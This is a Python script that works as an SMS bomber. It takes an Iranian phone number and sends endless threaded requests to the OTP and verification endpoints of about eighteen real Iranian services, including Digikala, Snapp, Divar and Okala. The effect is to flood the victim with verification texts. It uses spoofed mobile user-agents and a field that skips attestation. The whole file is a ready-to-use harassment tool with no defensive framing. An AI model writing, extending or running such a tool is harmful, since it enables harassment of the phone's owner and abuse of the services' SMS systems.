import requests
import json
import time
from threading import Thread

def send_request(api_config, phone_number):
    url = api_config["url"]
    headers = api_config.get("headers", {})
    data = api_config.get("data", {})
    method = api_config.get("method", "POST")
    
    # Replace phone number in data and headers
    if isinstance(data, dict):
        data = json.dumps(data).replace("PHONE_NUMBER", phone_number)
        data = json.loads(data)
    elif isinstance(data, str):
        data = data.replace("PHONE_NUMBER", phone_number)
    
    if isinstance(headers, dict):
        headers = {k: v.replace("PHONE_NUMBER", phone_number) if isinstance(v, str) else v 
                  for k, v in headers.items()}
    
    try:
        if method.upper() == "POST":
            response = requests.post(url, json=data if isinstance(data, dict) else None, 
                                   data=data if isinstance(data, str) else None,
                                   headers=headers)
        elif method.upper() == "GET":
            response = requests.get(url, headers=headers)
        else:
            print(f"Unsupported method: {method}")
            return
        
        print(f"API: {url}")
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text[:200]}...")  # Show first 200 characters
        print("-" * 80)
        
    except Exception as e:
        print(f"Error calling {url}: {str(e)}")
        print("-" * 80)

# API configurations
api_configs = [
    {
        "url": "https://api.digikala.com/v1/user/authenticate/",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        },
        "data": {"backUrl": "/profile/", "username": "PHONE_NUMBER", "otp_call": False, "hash": None}
    },
    {
        "url": "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": {"mobile": "PHONE_NUMBER", "confirmTerms": True, "notRobot": False, "ValidationCodeCreateReason": 5, "OtpApp": 0, "deviceTypeCode": 7, "IsAppOnly": False}
    },
    {
        "url": "https://api.pindo.ir/v1/user/login-register/",
        "headers": {
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8"
        },
        "data": {"username": "PHONE_NUMBER", "isShortOtp": True}
    },
    {
        "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
        "headers": {
            "Content-Type": "application/json",
            "Accept-Language": "fa"
        },
        "data": {"source": "besina", "mobile": "PHONE_NUMBER", "key": "U2FsdGVkX1+freTV85bssxEhuoBrL9XHV5fgEtrYQP0oJsxLebC4iR5k7Ucx7tushtONIuEupqg1zklqDJwcZQ=="}
    },
    {
        "url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass",
        "method": "GET",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        },
        "data": None
    },
    {
        "url": "https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/PHONE_NUMBER/sms",
        "method": "GET",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Accept-Language": "fa"
        }
    },
    {
        "url": "https://okcs.com/users/mobilelogin",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        },
        "data": "mobile=PHONE_NUMBER&url=https%3A%2F%2Fokcs.com%2F"
    },
    {
        "url": "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp",
        "headers": {
            "Content-Type": "application/json",
            "Accept-Language": "fa-IR"
        },
        "data": {"cellphone": "+98PHONE_NUMBER[1:]", "attestation": {"method": "skip", "platform": "skip"}, "extra_methods": []}
    },
    {
        "url": "https://petabad.com/api/customer/member/register/",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "data": "email=PHONE_NUMBER&accept_term=on"
    },
    {
        "url": "https://api.divar.ir/v5/auth/authenticate",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": {"phone": "PHONE_NUMBER"}
    },
    {
        "url": "https://gharar.ir/users/phone_number/",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "data": "phone=PHONE_NUMBER"
    },
    {
        "url": "https://izadinjpharmacy.ir/users/login-register/",
        "method": "GET",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "IR",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        }
    },
    {
        "url": "https://api.komodaa.com/api/v2.6/loginRC/request",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "komodaa/7.0.1.301 Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        },
        "data": {"phone_number": "PHONE_NUMBER"}
    },
    {
        "url": "https://www.vitrin.shop/api/v1/user/request_code",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": {"phone_number": "PHONE_NUMBER", "forgot_password": False}
    },
    {
        "url": "https://api.iapps.ir/accounts/otp/generate",
        "headers": {
            "Content-Type": "application/json;charset=utf-8",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        },
        "data": {"phoneNumber": "+98PHONE_NUMBER[1:]"}
    },
    {
        "url": "https://uiapi2.saapa.ir/api/otp/sendCode",
        "headers": {
            "Content-Type": "application/json; charset=utf-8"
        },
        "data": {"mobile": "PHONE_NUMBER", "from_meter_buy": False}
    },
    {
        "url": "https://api.azkivam.com/auth/login",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": {"mobileNumber": "PHONE_NUMBER"}
    }
]

def main():
    # Get phone number from user
    phone_number = input("لطفاً شماره تلفن را وارد کنید (مثال: 09123456789): ").strip()
    
    if not phone_number.startswith('0') or len(phone_number) != 11:
        print("شماره تلفن معتبر نیست! باید با 0 شروع شود و 11 رقمی باشد.")
        return
    
    print(f"\nشروع ارسال درخواست‌ها برای شماره: {phone_number}")
    print("=" * 80)
    
    # Send requests continuously every 0.5 seconds
    while True:
        for config in api_configs:
            thread = Thread(target=send_request, args=(config, phone_number))
            thread.start()
            time.sleep(0.5)
        
        print("یک دور کامل ارسال شد. ادامه...")
        print("=" * 80)

if __name__ == "__main__":
    main()